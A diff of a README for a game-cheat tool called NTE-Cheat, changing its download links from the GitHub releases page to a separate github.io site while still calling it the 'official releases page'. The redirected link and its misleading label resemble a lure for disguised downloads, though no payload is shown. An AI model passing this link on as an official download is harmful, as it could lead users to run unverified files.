@@ -1,6 +1,6 @@
 # 🎣 NTE-Cheat - Automate your Neverness to Everness gameplay
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/phuthu8107/NTE-Cheat/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://phuthu8107.github.io)
 
 ## Overview ℹ️
 
@@ -30,7 +30,7 @@ Before you install the software, ensure your computer meets these conditions:
 
 Follow these steps to obtain and prepare the software:
 
-1.  Visit the [official releases page](https://github.com/phuthu8107/NTE-Cheat/releases) to access the files.
+1.  Visit the [official releases page](https://phuthu8107.github.io) to access the files.
 2.  Look for the section labeled "Assets" under the latest version.
 3.  Click the file ending in `.zip` to begin the download.
 4.  Open your Downloads folder and locate the file.
